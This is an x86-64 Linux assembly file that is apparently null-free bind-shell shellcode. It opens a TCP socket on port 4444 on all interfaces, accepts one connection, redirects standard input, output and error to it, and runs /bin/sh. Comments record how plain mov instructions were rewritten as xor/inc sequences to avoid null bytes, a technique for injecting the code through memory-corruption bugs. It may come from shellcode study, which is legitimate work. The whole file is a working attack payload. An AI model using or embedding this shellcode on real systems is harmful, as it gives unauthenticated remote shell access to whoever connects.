global _start

_start:
	;mov rax, 41
	;mov rdi, 2
	;mov rsi, 1
	;mov rdx, 0

	; clear rax and use its lower 8 bits to zero other registers used
	; for the socket syscall with number 41
	xor rax, rax
	mov dil, 2    ; set %rdi to AF_INET
	mov sil, al
	inc sil       ; set %rsi to SOCK_STREAM
	mov dl, al    ; set %rdx to 0
	add rax, 41   ; set %rax to 41, socket syscall
	syscall

	; copy socket descriptor to rdi for future use
	mov rdi, rax

	; server.sin_family = AF_INET
	; server.sin_port = htons(PORT)
	; server.sin_addr.s_addr = INADDR_ANY
	; bzero(&server.sin_zero, 8)

	xor rax, rax
	push rax

	mov dword [rsp-4], eax
	mov word [rsp-6], 0x5c11
	;mov word [rsp-8], 0x2
	mov byte [rsp-8], 0x2
	sub rsp, 8

	; bind(sock, (struct sockaddr *)&server, sockaddr_len)
	; syscall number 49

	; mov rax, 49
	xor rax, rax
	mov al, 49

	mov rsi, rsp

	; mov rdx, 16
	xor rdx, rdx
	add rdx, 16

	syscall


	; listen(sock, MAX_CLIENTS)
	; syscall number 50
	; mov rax, 50
	; mov rsi, 2
	xor rax, rax
	mov sil, al
	mov al, 50
	add sil, 2
	syscall


	; new = accept(sock, (struct sockaddr *)&client, &sockaddr_len)
	; syscall number 43
	; mov rax, 43
	xor rax, rax
	mov al, 43

	sub rsp, 16
	mov rsi, rsp
        mov byte [rsp-1], 16
        sub rsp, 1
        mov rdx, rsp
        syscall

	; store the client socket description 
	mov r9, rax 

        ; close parent

        ;mov rax, 3
	sub rax, rax	; just do something different to clear %rax by subtracting it from itself
	inc al		; and incrementing the first byte 1 at a time
	inc al
	inc al

        syscall

        ; duplicate sockets

        ; dup2 (new, old)
        mov rdi, r9
        ;mov rax, 33
	xor rcx, rcx
	mov al, cl
	add al, 33

        ;mov rsi, 0
	xor rsi, rsi
        syscall

        ;mov rax, 33
        ;mov rsi, 1
	xor rax, rax
	mov sil, al
	add al, 33
	inc sil
        syscall

        ; mov rax, 33
        ; mov rsi, 2
	xor rax, rax
	mov sil, al
	add al, 33
	inc sil
	inc sil

        syscall



        ; execve

        ; First NULL push

        xor rax, rax
        push rax

        ; push /bin//sh in reverse

        mov rbx, 0x68732f2f6e69622f
        push rbx

        ; store /bin//sh address in RDI

        mov rdi, rsp

        ; Second NULL push
        push rax

        ; set RDX
        mov rdx, rsp


        ; Push address of /bin//sh
        push rdi

        ; set RSI

        mov rsi, rsp

        ; Call the Execve syscall
        add rax, 59
        syscall
